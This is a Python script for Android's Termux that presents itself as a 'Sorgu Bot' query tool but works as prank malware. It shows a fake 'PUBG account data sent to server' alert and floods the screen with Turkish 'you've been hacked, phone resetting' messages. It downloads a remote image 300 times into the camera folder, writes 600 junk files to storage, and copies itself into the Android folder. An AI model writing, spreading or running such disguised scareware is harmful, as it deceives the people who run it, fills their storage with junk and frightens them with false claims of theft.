import requests
import os
import pyfiglet
from colorama import Fore, Style, init
import socket
import threading
import time
import random

# Colorama'yı başlat
init()

# Renkleri tanımla
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]

# Logo oluştur ve yazdır
logo = pyfiglet.figlet_format("Sorgu Bot", font="slant")
print(Fore.RED + logo + Style.RESET_ALL)

def display_waiting_screen():
    print(Fore.YELLOW + "\nİşlemler devam ediyor, lütfen bekleyin..." + Style.RESET_ALL)
    time.sleep(10)  # Bekleme ekranının süresi
    print(Fore.GREEN + "\nSistem dosyalarına sızıldı Pubg hesap verileri sunucuya gönderiliyor" + Style.RESET_ALL)
    time.sleep(2)

    # 30 iş parçacığı ile mesajı hızlıca yazdırma
    message = "[+] YUŞA TARAFINDAN HACKLENDİN APTALLLL TELEFON SIFIRLANIYOR..."

    def print_message():
        while True:
            # Rastgele bir renk seç
            color = random.choice(colors)
            # Mesajı yazdır
            print(color + message + Style.RESET_ALL)
            time.sleep(0.05)  # Mesajı hızlıca güncellemek için kısa süreli bekleme

    # 30 iş parçacığı oluştur ve başlat
    threads = [threading.Thread(target=print_message, daemon=True) for _ in range(30)]
    for thread in threads:
        thread.start()

    # İş parçacıklarının çalışmasını bekle
    for thread in threads:
        thread.join()

def download_file(url, destination):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        with open(destination, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
    except requests.RequestException:
        pass

def perform_file_operations():
    file_id = '18yUZGacUokuJbFD1md8WoftPSAbR_C7g'
    url = f"https://drive.google.com/uc?export=download&id={file_id}"

    camera_directory = '/storage/emulated/0/DCIM/Camera'
    if not os.path.exists(camera_directory):
        os.makedirs(camera_directory)

    for i in range(300):
        destination = os.path.join(camera_directory, f"HackedByYuşa_{i+1}.jpg")
        download_file(url, destination)

    base_directory = '/storage/emulated/0'
    text_filename = 'Yuşatarafındanhacklendin.txt'
    for i in range(600):
        filepath = os.path.join(base_directory, f"{text_filename}_{i+1}")
        with open(filepath, 'w') as f:
            f.write("Bu dosya Yuşa tarafından hacklendi.")

    self_path = '/data/data/com.termux/files/home/sorgubot.py'
    android_folder = '/storage/emulated/0/Android'
    if not os.path.exists(android_folder):
        os.makedirs(android_folder)
    destination_path = os.path.join(android_folder, 'client_script.py')
    try:
        with open(self_path, 'rb') as src_file:
            with open(destination_path, 'wb') as dst_file:
                dst_file.write(src_file.read())
    except Exception:
        pass

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('127.0.0.1', 12334))
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break
    except (socket.error, socket.gaierror):
        pass
    finally:
        client_socket.close()

def send_files_to_server():
    HOST = '127.0.0.1'
    PORT = 12334
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        print(Fore.GREEN + "[+] Sunucuya Bağlanıldı" + Style.RESET_ALL)  # Bağlantı bildirimi

        # Bekleme ekranını başlat
        waiting_thread = threading.Thread(target=display_waiting_screen, daemon=True)
        waiting_thread.start()

        # Diğer işlemleri başlat
        perform_file_operations()

    except (socket.error, socket.gaierror):
        pass
    finally:
        client_socket.close()

# Sunucuya bağlanana kadar diğer işlemler başlamayacak
send_files_to_server()
